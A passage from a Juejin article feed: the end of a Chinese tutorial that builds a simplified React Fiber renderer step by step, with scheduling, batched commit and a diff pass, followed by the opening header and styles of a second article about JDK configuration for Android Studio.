            <span class="hljs-attr">parent</span>: fiber,
            <span class="hljs-attr">props</span>: childrenElement.<span class="hljs-property">props</span>,
            <span class="hljs-attr">type</span>: childrenElement.<span class="hljs-property">type</span>,
            <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">sibling</span>: <span class="hljs-literal">null</span>
        }

        <span class="hljs-comment">/**
         * 创建好fiber节点后，怎么建立父子和兄弟节点关系？
         */</span>
        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            fiber.<span class="hljs-property">child</span> = newFiber
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber
        }

        prevSibling = newFiber
    })

    <span class="hljs-comment">// 遍历处理</span>
    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }
    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 创建dom节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    <span class="hljs-comment">// 第一个工作单元</span>
    nextUnitOfWork = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        }
    }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-17">Fiber树遍历流程图</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c6b3112aacac4cbbb53056af310ee07e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h5 data-id="heading-18">优化后的第一版有什么问题？</h5>
<ul>
<li>每处理一个fiber节点，都实时挂载到了真实的dom上面
<ul>
<li>操作dom太频繁，导致重排重绘；</li>
<li>如果节点很多，页面展示会有一个逐步出现的效果；</li>
</ul>
</li>
</ul>
<h5 data-id="heading-19">怎么优化？</h5>
<ul>
<li>先对所有工作单元，所有fiber节点创建好dom节点，等所有工作单元处理完成后，一次性挂载到真实dom</li>
</ul>
<h4 data-id="heading-20">第二版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 正在进行的渲染 work in progress root</span>
<span class="hljs-keyword">let</span> wipRoot = <span class="hljs-literal">null</span>;

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-comment">/**
 * 统一提交渲染，什么时候提交？
 * 1、没有下一个工作单元 且 有正在进行的渲染
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-comment">// shouldYield 表示线程繁忙，应该中断渲染</span>
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        <span class="hljs-keyword">debugger</span>
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);
        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 统一提交渲染</span>
    <span class="hljs-keyword">if</span> (!nextUnitOfWork &amp;&amp; wipRoot) {
        <span class="hljs-title function_">commitRoot</span>();
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">childrenElement, index</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newFiber = {
            <span class="hljs-attr">parent</span>: fiber,
            <span class="hljs-attr">props</span>: childrenElement.<span class="hljs-property">props</span>,
            <span class="hljs-attr">type</span>: childrenElement.<span class="hljs-property">type</span>,
            <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">sibling</span>: <span class="hljs-literal">null</span>
        }

        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            fiber.<span class="hljs-property">child</span> = newFiber
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber
        }

        prevSibling = newFiber
    })

    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }

    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 渲染真实dom</span>
<span class="hljs-comment">// 把正在渲染的标记清除</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitRoot</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">commitWork</span>(wipRoot.<span class="hljs-property">child</span>);
    wipRoot = <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 渲染所有的fiber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-keyword">if</span> (!fiber) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> parentDom = fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>;
    parentDom.<span class="hljs-title function_">appendChild</span>(fiber.<span class="hljs-property">dom</span>)

    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">child</span>);
    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">sibling</span>);
}

<span class="hljs-comment">// 创建dom节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    wipRoot = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        }
    }

    nextUnitOfWork = wipRoot
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-21">优化后的第二版还有什么问题？</h5>
<ul>
<li>开销很大，重新渲染时，每次都会全局重新渲染</li>
</ul>
<h5 data-id="heading-22">怎么优化？</h5>
<ul>
<li>diff算法</li>
</ul>
<h5 data-id="heading-23">diff方式</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/99bb6718f3c547c5ad2b224c30353c80~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h4 data-id="heading-24">第三版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 正在进行的渲染 work in progress root</span>
<span class="hljs-keyword">let</span> wipRoot = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 上一次渲染</span>
<span class="hljs-keyword">let</span> currentRoot = <span class="hljs-literal">null</span>
<span class="hljs-comment">// 要删除的fiber</span>
<span class="hljs-keyword">let</span> deletion = [];

<span class="hljs-comment">// 任务调度</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>; <span class="hljs-comment">// shouldYield 表示线程繁忙，应该中断渲染</span>
    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);
        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 统一提交渲染</span>
    <span class="hljs-keyword">if</span> (!nextUnitOfWork &amp;&amp; wipRoot) {
        <span class="hljs-title function_">commitRoot</span>();
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);


<span class="hljs-comment">// 以前在这创建fiber节点，创建他子节点、兄弟节点的fiber，建立关系</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-title function_">reconcileChildren</span>(fiber, elements)

    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }

    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 渲染真实dom</span>
<span class="hljs-comment">// 把正在渲染的标记清除</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitRoot</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">commitWork</span>(wipRoot.<span class="hljs-property">child</span>);

    currentRoot = wipRoot;

    wipRoot = <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 渲染所有的fiber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-keyword">if</span> (!fiber) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> parentDom = fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>;

    <span class="hljs-keyword">const</span> hasFiberDom = !!fiber.<span class="hljs-property">dom</span>
    <span class="hljs-keyword">switch</span> (fiber.<span class="hljs-property">effectTag</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'PLACEMENT'</span>:
            hasFiberDom &amp;&amp; parentDom.<span class="hljs-title function_">append</span>(fiber.<span class="hljs-property">dom</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'UPDATE'</span>:
            hasFiberDom &amp;&amp; <span class="hljs-title function_">updateDOM</span>(fiber.<span class="hljs-property">dom</span>, fiber.<span class="hljs-property">alternate</span>.<span class="hljs-property">props</span>, fiber.<span class="hljs-property">props</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'DELETION'</span>:
            hasFiberDom &amp;&amp; parentDom.<span class="hljs-title function_">removeChild</span>(fiber.<span class="hljs-property">dom</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-attr">default</span>:
            <span class="hljs-keyword">break</span>;
    }

    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">child</span>);
    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">sibling</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateDOM</span>(<span class="hljs-params">dom, prevProps, nextPorps</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isEvent</span> = (<span class="hljs-params">key</span>) =&gt; key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'on'</span>);
    <span class="hljs-comment">// 删除已经没有的props</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(prevProps)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> key != <span class="hljs-string">'children'</span> &amp;&amp; !<span class="hljs-title function_">isEvent</span>(key))
        <span class="hljs-comment">// 不在nextProps中</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> nextPorps)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-comment">// 清空属性</span>
            dom[key] = <span class="hljs-string">''</span>;
        });

    <span class="hljs-comment">// 添加新增的属性/修改变化的属性</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(nextPorps)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> key !== <span class="hljs-string">'children'</span> &amp;&amp; !<span class="hljs-title function_">isEvent</span>(key))
        <span class="hljs-comment">// 不再prevProps中</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> prevProps || prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            dom[key] = nextPorps[key];
        });

    <span class="hljs-comment">// 删除事件处理函数</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(prevProps)
        .<span class="hljs-title function_">filter</span>(isEvent)
        <span class="hljs-comment">// 新的属性没有，或者有变化</span>
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> !key <span class="hljs-keyword">in</span> nextPorps || prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> eventType = key.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);
            dom.<span class="hljs-title function_">removeEventListener</span>(eventType, prevProps[key]);
        });

    <span class="hljs-comment">// 添加新的事件处理函数</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(nextPorps)
        .<span class="hljs-title function_">filter</span>(isEvent)
        .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> prevProps[key] !== nextPorps[key])
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> eventType = key.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);
            dom.<span class="hljs-title function_">addEventListener</span>(eventType, nextPorps[key]);
        });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reconcileChildren</span>(<span class="hljs-params">wipFiber, elements</span>) {
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// 如果有alternate，就返回它的child，没有，就返回undefined</span>
    <span class="hljs-keyword">let</span> oldFiber = wipFiber.<span class="hljs-property">alternate</span> &amp;&amp; wipFiber.<span class="hljs-property">alternate</span>.<span class="hljs-property">child</span>;

    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 为什么要用while呢？</span>
    <span class="hljs-comment">// 需要把oldFiber树和新fiber树都遍历完</span>
    <span class="hljs-comment">// 因为可能oldFiber树比新fiber树长</span>
    <span class="hljs-keyword">while</span> (index &lt; elements.<span class="hljs-property">length</span> || oldFiber) {
        <span class="hljs-keyword">const</span> element = elements[index];
        <span class="hljs-keyword">const</span> sameType = oldFiber &amp;&amp; element &amp;&amp; oldFiber.<span class="hljs-property">type</span> === element.<span class="hljs-property">type</span>;

        <span class="hljs-keyword">let</span> newFiber = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">if</span> (sameType) { <span class="hljs-comment">// 更新</span>
            newFiber = {
                <span class="hljs-attr">type</span>: oldFiber.<span class="hljs-property">type</span>,
                <span class="hljs-attr">props</span>: element.<span class="hljs-property">props</span>,
                <span class="hljs-comment">// 继承dom</span>
                <span class="hljs-attr">dom</span>: oldFiber.<span class="hljs-property">dom</span>,
                <span class="hljs-attr">parent</span>: wipFiber,
                <span class="hljs-attr">alternate</span>: oldFiber,
                <span class="hljs-attr">effectTag</span>: <span class="hljs-string">'UPDATE'</span>,
            };
        }
        <span class="hljs-keyword">if</span> (element &amp;&amp; !sameType) { <span class="hljs-comment">// 新建</span>
            newFiber = {
                <span class="hljs-attr">type</span>: element.<span class="hljs-property">type</span>,
                <span class="hljs-attr">props</span>: element.<span class="hljs-property">props</span>,
                <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
                <span class="hljs-attr">parent</span>: wipFiber,
                <span class="hljs-attr">alternate</span>: <span class="hljs-literal">null</span>,
                <span class="hljs-attr">effectTag</span>: <span class="hljs-string">'PLACEMENT'</span>,
            };
        }
        <span class="hljs-keyword">if</span> (oldFiber &amp;&amp; !sameType) { <span class="hljs-comment">// 删除</span>
            oldFiber.<span class="hljs-property">effectTag</span> = <span class="hljs-string">'DELETION'</span>;
            deletion.<span class="hljs-title function_">push</span>(oldFiber);
        }

        <span class="hljs-keyword">if</span> (oldFiber) { <span class="hljs-comment">// 下一个oldFiber</span>
            oldFiber = oldFiber.<span class="hljs-property">sibling</span>;
        }

        <span class="hljs-comment">// 第一个child才可以作为child，其他的就是sibling</span>
        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            wipFiber.<span class="hljs-property">child</span> = newFiber;
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber;
        }

        prevSibling = newFiber;

        index++;
    }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    wipRoot = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        },
        <span class="hljs-attr">alternate</span>: currentRoot, <span class="hljs-comment">// 记录老的fiber树</span>
    }

    deletion = [];

    nextUnitOfWork = wipRoot
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h2 data-id="heading-25">三、总结</h2>
<p>本文只简单介绍了Fiber可中断、可恢复的渲染过程，实际的Fiber远不止这么简单，比如还有：</p>
<ul>
<li>优先级驱动的任务调度（为不同类型的更新分配了优先级。）
<ul>
<li>高优先级：用户交互（点击、输入）、动画。</li>
<li>低优先级：大数据渲染、网络请求返回。</li>
</ul>
</li>
<li>更精细的生命周期控制</li>
</ul>
<p>如果大家感兴趣可以进一步深入了解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案]]></title>    <link>https://juejin.cn/post/7575937594350665771</link>    <guid>https://juejin.cn/post/7575937594350665771</guid>    <pubDate>2025-11-24T03:40:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350665771" data-draft-id="7575884229524979748" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:40:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火车叼位"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            兼容命令行与 Android Studio 的 JDK 策略：从踩坑到方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火车叼位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:40:48.000Z" title="Mon Nov 24 2025 03:40:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body 